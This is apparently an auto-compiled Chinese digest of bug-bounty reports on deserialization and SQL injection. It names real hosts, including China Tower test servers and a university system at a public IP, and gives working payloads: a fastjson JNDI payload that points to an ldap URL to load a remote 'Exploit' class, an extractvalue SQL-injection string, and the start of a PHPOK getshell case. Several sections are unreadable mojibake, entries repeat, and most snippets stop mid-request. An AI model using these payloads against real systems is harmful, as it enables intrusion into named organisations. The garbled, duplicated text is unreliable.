# SRC 实战报告提炼 — deserialization

> 来源：蚂蚁SRC榜一Clown的 12 份实战报告
> 提取时间：2026-09-14

## 典型案例摘要（12 份）

### 铁塔

漏洞http://testeip.chinatowercom.cn:17590/iserver/ 在www.dnslog.cn生成个目标 zi6tti.dnslog.cn 用fastjson工具生成Payload 抓 http://testeip.chinatowercom.cn:17590/iserver/ 包改POST请求 请求内容： {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry": "ldap://zi6tti.dnslog.cn/Exploit"} POC: POST /iserver/ HT

### 铁塔(2)

漏洞http://dp.test.chinatowercom.cn:6097/iserver/services/security/login 在www.dnslog.cn生成个目标 lxkcup.dnslog.cn 用fastjson工具生成Payload 使用工具打： http://dp.test.chinatowercom.cn:6097/iserver/services/security/login

### 网易 SRC 漏洞挖掘总结

ಅ᧲ӡԪ୏१ᵙ̶ ௳තᵞ҅ᬯฎᘙᩇ አ෸ᳵ๋ᳩጱӞӻሾᜓ҅ᘒӬਙฎӞӻ೮ᖅ௔ጱᬦᑕ̶ SRCೡ 1. ޾ݷIPྦྷ 2. ௳ ̶ ୞ ̶ ਫஉग़ԧ 1.चԭSSLᦤԡັᧃ 2.ັᧃ 3.Github 4.DNSᥴຉᦕ୯ 5.ຍԈᒵᒵ ౯ԅՋԍ಩चԭSSLᑕጱ̶ ଙ12ࢩ ೵യᗑฃSRCᚆጱ᪃ड़ਠෆ ොဩ ੤ᦶ҅ӧᚆჿ᪃ԭሿᇫ̶ चԭSSLᦤԡັᧃጱํ 1.censys.io 2.crt.sh ັᧃᗑᒊํ 1.riskiq 2.shodan 3.ﬁndsubdomains [௳තᵞ]  [තᵞ]  4.censys.io 5.dnsdb.io ᬯ᯾DNS̶ አचԭSSLࣁGithubى ኞԾᗑ๦ᴴ

### SRC挖掘那些事

ಅ᧲ӡԪ୏१ᵙ̶ ௳තᵞ҅ᬯฎᘙᩇ አ෸ᳵ๋ᳩጱӞӻሾᜓ҅ᘒӬਙฎӞӻ೮ᖅ௔ጱᬦᑕ̶ SRCೡ 1. ޾ݷIPྦྷ 2. ௳ ̶ ୞ ̶ ਫஉग़ԧ 1.चԭSSLᦤԡັᧃ 2.ັᧃ 3.Github 4.DNSᥴຉᦕ୯ 5.ຍԈᒵᒵ ౯ԅՋԍ಩चԭSSLᑕጱ̶ ଙ12ࢩ ೵യᗑฃSRCᚆጱ᪃ड़ਠෆ ොဩ ੤ᦶ҅ӧᚆჿ᪃ԭሿᇫ̶ चԭSSLᦤԡັᧃጱํ 1.censys.io 2.crt.sh ັᧃᗑᒊํ 1.riskiq 2.shodan 3.ﬁndsubdomains [௳තᵞ]  [තᵞ]  4.censys.io 5.dnsdb.io ᬯ᯾DNS̶ አचԭSSLࣁGithubى ኞԾᗑ๦ᴴ

### 中国农业大学SQL注入_远程命令执行

漏洞地址：http://123.57.61.125:8080/login 漏洞位置在”系统管理”里中的”角色管理中” POC：pageSize=&pageNum=&orderByColumn=&isAsc=&roleName=&roleKey=& status=¶ms[beginTime]=¶ms[endTime]=¶ms[dataScope]=and extractvalue(1,concat(0x7e,substring((select database()),1,32),0x7e)) 数据包： POST /system/role/list HTTP/1.1 Host: 123.57.61

### 中国农业大学SQL注入_远程命令执行 (1)

漏洞地址：http://123.57.61.125:8080/login 漏洞位置在”系统管理”里中的”角色管理中” POC：pageSize=&pageNum=&orderByColumn=&isAsc=&roleName=&roleKey=& status=¶ms[beginTime]=¶ms[endTime]=¶ms[dataScope]=and extractvalue(1,concat(0x7e,substring((select database()),1,32),0x7e)) 数据包： POST /system/role/list HTTP/1.1 Host: 123.57.61

### 铁塔

漏洞http://testeip.chinatowercom.cn:17590/iserver/ 在www.dnslog.cn生成个目标 zi6tti.dnslog.cn 用fastjson工具生成Payload 抓 http://testeip.chinatowercom.cn:17590/iserver/ 包改POST请求 请求内容： {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry": "ldap://zi6tti.dnslog.cn/Exploit"} POC: POST /iserver/ HT

### 铁塔(2)

漏洞http://dp.test.chinatowercom.cn:6097/iserver/services/security/login 在www.dnslog.cn生成个目标 lxkcup.dnslog.cn 用fastjson工具生成Payload 使用工具打： http://dp.test.chinatowercom.cn:6097/iserver/services/security/login

### 网易 SRC 漏洞挖掘总结

ಅ᧲ӡԪ୏१ᵙ̶ ௳තᵞ҅ᬯฎᘙᩇ አ෸ᳵ๋ᳩጱӞӻሾᜓ҅ᘒӬਙฎӞӻ೮ᖅ௔ጱᬦᑕ̶ SRCೡ 1. ޾ݷIPྦྷ 2. ௳ ̶ ୞ ̶ ਫஉग़ԧ 1.चԭSSLᦤԡັᧃ 2.ັᧃ 3.Github 4.DNSᥴຉᦕ୯ 5.ຍԈᒵᒵ ౯ԅՋԍ಩चԭSSLᑕጱ̶ ଙ12ࢩ ೵യᗑฃSRCᚆጱ᪃ड़ਠෆ ොဩ ੤ᦶ҅ӧᚆჿ᪃ԭሿᇫ̶ चԭSSLᦤԡັᧃጱํ 1.censys.io 2.crt.sh ັᧃᗑᒊํ 1.riskiq 2.shodan 3.ﬁndsubdomains [௳තᵞ]  [තᵞ]  4.censys.io 5.dnsdb.io ᬯ᯾DNS̶ አचԭSSLࣁGithubى ኞԾᗑ๦ᴴ

### SRC挖掘那些事

ಅ᧲ӡԪ୏१ᵙ̶ ௳තᵞ҅ᬯฎᘙᩇ አ෸ᳵ๋ᳩጱӞӻሾᜓ҅ᘒӬਙฎӞӻ೮ᖅ௔ጱᬦᑕ̶ SRCೡ 1. ޾ݷIPྦྷ 2. ௳ ̶ ୞ ̶ ਫஉग़ԧ 1.चԭSSLᦤԡັᧃ 2.ັᧃ 3.Github 4.DNSᥴຉᦕ୯ 5.ຍԈᒵᒵ ౯ԅՋԍ಩चԭSSLᑕጱ̶ ଙ12ࢩ ೵യᗑฃSRCᚆጱ᪃ड़ਠෆ ොဩ ੤ᦶ҅ӧᚆჿ᪃ԭሿᇫ̶ चԭSSLᦤԡັᧃጱํ 1.censys.io 2.crt.sh ັᧃᗑᒊํ 1.riskiq 2.shodan 3.ﬁndsubdomains [௳තᵞ]  [තᵞ]  4.censys.io 5.dnsdb.io ᬯ᯾DNS̶ አचԭSSLࣁGithubى ኞԾᗑ๦ᴴ

### 中国农业大学SQL注入_远程命令执行

漏洞地址：http://123.57.61.125:8080/login 漏洞位置在”系统管理”里中的”角色管理中” POC：pageSize=&pageNum=&orderByColumn=&isAsc=&roleName=&roleKey=& status=¶ms[beginTime]=¶ms[endTime]=¶ms[dataScope]=and extractvalue(1,concat(0x7e,substring((select database()),1,32),0x7e)) 数据包： POST /system/role/list HTTP/1.1 Host: 123.57.61

### PHPOK 5.5 csrf+反序列化漏洞getshell

PHPOK 5.5 csrf+反序列化漏洞 getshell  一、漏洞简介  二、漏洞影响  PHPOK 5.5  三、复现过程  可利用恶意类  恶意类文件：framework\engine\cache.php  关键代码：  <?php  class cache{      public function save($id,$content=’’){          if(!$id || $content === ’’ || !$this->status){              return false;          }          $this->_time();  

## 实战 Payload 集（1 条去重）

### SQL

```
extractvalue(1,concat(0x7e,substring((select database()),1,32),0x7e))
```

## 技术手法统计

- 漏洞利用: 1 次

